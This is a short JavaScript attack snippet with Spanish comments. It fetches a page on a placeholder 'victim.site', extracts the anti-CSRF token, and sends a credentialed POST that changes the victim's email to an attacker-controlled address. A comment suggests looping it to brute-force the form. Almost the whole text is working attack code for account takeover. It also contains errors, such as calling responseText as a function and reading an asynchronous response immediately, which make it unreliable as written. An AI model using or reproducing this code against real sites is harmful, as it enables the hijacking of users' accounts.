

var req= new XMLHttpRequest();

req.open('GET','http://victim.site/crsf-form-page.html', true);
req.send();
var sourceHTML= req.responseText();

//Opcion 1 para coger token de sourceHTML
// <input type='hidden' name='crsf_token' value='v325ahshf'/>
pattern= /crsf_token'\svalue='(.*)'/;
token = sourceHTML.match(pattern)[1];

//Opcion 2
parser = new DOMParser().parseFromString(sourceHTML,"text/html");
token = parser.getElementsByName('crsf_token')[0];

//función para bruteforcear form (Meter en bucle)
function XHRPost(tokenID){
	var http= new XMLHttpRequest();
	var url= "http://victim.site/crsf/chage_post.php";
	http.open("POST",url,true);

	http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
	http.withCredentials= 'true'

	var params= "old=myoldemail&confirm=1&new=attackerEmail&csrfToken="+ tokenID;
	http.send(params);
}